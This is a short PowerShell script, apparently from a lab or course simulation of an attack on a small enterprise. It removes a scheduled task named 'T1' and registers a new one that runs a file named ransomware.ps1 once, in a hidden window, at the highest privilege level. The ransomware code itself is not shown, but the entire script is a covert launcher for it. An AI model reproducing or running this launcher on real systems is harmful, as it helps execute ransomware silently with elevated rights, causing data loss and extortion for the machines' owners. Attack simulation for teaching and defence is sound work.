Unregister-ScheduledTask -TaskName "T1" -Confirm:$false
$action = New-ScheduledTaskAction -Execute "pwsh" -Argument "-WindowStyle hidden C:\Users\user\Documents\m2_minientreprise_scripts\scripts\ransomware.ps1"
$trigger = New-ScheduledTaskTrigger -At 14:12 -Once
$principal = New-ScheduledTaskPrincipal -UserId "user" -RunLevel Highest
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
Register-ScheduledTask T1 -InputObject $task